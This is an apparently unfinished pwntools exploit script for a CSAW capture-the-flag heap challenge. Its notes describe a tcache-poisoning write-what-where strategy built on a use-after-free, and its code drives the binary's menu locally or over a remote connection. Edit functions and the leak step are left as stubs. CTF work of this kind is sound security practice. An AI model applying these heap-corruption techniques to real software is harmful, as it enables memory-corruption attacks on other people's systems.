#!/usr/bin/env python3

from pwn import *

""" Notes
sizeof(struct Friend) == 16
sizeof(union identifier) == 8
tcache is used when friends are freed

Write-What-Where Strategy:
-create an unwanted robot (to avoid "too few friends")
-create a robot
-free the robot
-edit the robot, setting barcode to `where`
-create another unwanted robot
-create another robot; it will be at `where`
-edit this robot, setting barcode to `what`
-you have written `what` to `where`

Leak Strategy:
-???
"""

def addfriend(human_name, name, age):#null human_name to leak
    assert human_name == b'' or int(human_name)
    assert len(name) < 64
    print(conn.recvuntil(b'> ').decode())
    print(b'1\n')
    conn.sendline(b'1')
    print(conn.recvuntil(b'?\n').decode())
    print(human_name+name+b'\n')
    conn.sendline(human_name+name)
    print(conn.recvuntil(b"?\n").decode())
    print(str(age).encode()+b'\n')
    conn.sendline(str(age).encode())

def addrobot(barcode, age):
    print(conn.recvuntil(b'> ').decode())
    print(b'1\n')
    conn.sendline(b'1')
    print(conn.recvuntil(b'?\n').decode())
    print(b'0\n')
    conn.sendline(b'0')
    print(conn.recvuntil(b"?\n").decode())
    print(str(barcode).encode()+b'\n')
    conn.sendline(str(barcode).encode())
    print(conn.recvuntil(b"?\n").decode())
    print(str(age).encode()+b'\n')
    conn.sendline(str(age).encode())

def free(index):
    print(conn.recvuntil(b'> ').decode())
    print(b'2\n')
    conn.sendline(b'2\n')
    print(conn.recvuntil(b'?\n'))
    print(str(index).encode()+b'\n')
    conn.sendline(str(index).encode())

def editfriend(index, newname, newage):
    print(conn.recvuntil(b'> ').decode())
    print(b'4\n')
    conn.sendline(b'4')
    print(conn.recvuntil(b'?\n'))
    #set index
    #if friend_type[index] != 0:
        #set char[63] name via fgets; send all 63 or use \n which will not be replaced but \0 will be tacked on
    #else:
        #set int64 id
    #set int age

def editrobot(index, newbarcode, newage):
    pass

def display(index):
    print(conn.recvuntil(b'> ').decode())
    print(b'3\n')
    conn.sendline(b'3')
    print(conn.recvuntil(b'\n').decode())
    print(str(index).encode()+b'\n')
    conn.sendline(str(index).encode())
    print(conn.recvuntil(b'age: ').decode()+conn.recvuntil(b'\n').decode())

if args.GDB:
    conn = gdb.debug('./worstcodeever', gdbscript=(''
         +'break display\n'
         +'commands\n'
         +'heap bins\n'#unfortunately this shows up before gef context
         +'end\n'
        #+'break add_friend\n'
        #+'break add_friend\n'
        #+'break remove_friend\n'
        #+'break edit_friend\n'
         +'c\n'#start automatically
        )
    )
elif args.LOCAL:
    conn = process('./worstcodeever')
else:
    conn = remote('pwn.red.csaw.io',5008)
    
addfriend(b'11',b'freddy',123)
addrobot(1234567,80)
display(0)
display(1)
free(1)
display(1)

conn.interactive()

conn.close()
